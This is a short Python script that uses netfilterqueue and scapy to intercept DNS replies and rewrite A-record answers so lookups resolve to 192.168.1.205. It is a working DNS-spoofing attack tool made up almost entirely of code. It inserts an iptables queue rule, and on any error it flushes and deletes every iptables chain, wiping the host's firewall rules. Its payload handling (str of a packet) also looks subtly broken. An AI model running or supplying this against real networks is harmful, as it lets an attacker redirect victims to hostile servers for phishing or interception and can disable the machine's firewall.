from netfilterqueue import NetfilterQueue
from scapy.all import *
import os

def callback(packet):
    redirect_to = '192.168.1.205'

    pkt = IP(packet.get_payload()) #converts the raw packet to a scapy compatible string
    if (pkt.haslayer(DNSRR) and (pkt[DNSRR][0].rdata != redirect_to) and (pkt[DNSQR][0].qtype == 1)): # DNS question record


        pkt.show()
        print('----------------------------------------------')

        pkt[DNSRR][0].rdata = redirect_to

        # Recalculation checksum and length 
        pkt[UDP].chksum = in4_chksum(socket.IPPROTO_UDP, pkt[UDP], raw(pkt[UDP]))
        pkt[UDP].len = len(raw(pkt[UDP]))
        
        pkt[IP].chksum = in4_chksum(socket.IPPROTO_IP, pkt[IP], raw(pkt[IP]))
        pkt[IP].len = len(raw(pkt[IP]))

        # print('----------------------------------------------')
        pkt.show()
                
        packet.set_payload(str(pkt)) #set the packet content to our modified version

        packet.accept() #accept the packet
        # sendp(spoofed_pkt, iface='wlp2s0')
        print ('Sent:', pkt.summary())
        # exit()
        # raise Exception("Done")

def main ():
	os.system("iptables -A INPUT -p udp --sport 53 -j NFQUEUE --queue-num 8")
	nfqueue = NetfilterQueue()
	nfqueue.bind(8, callback)

	try:
		nfqueue.run() 
	except:
	    os.system('iptables -F')
	    os.system('iptables -X')

main()
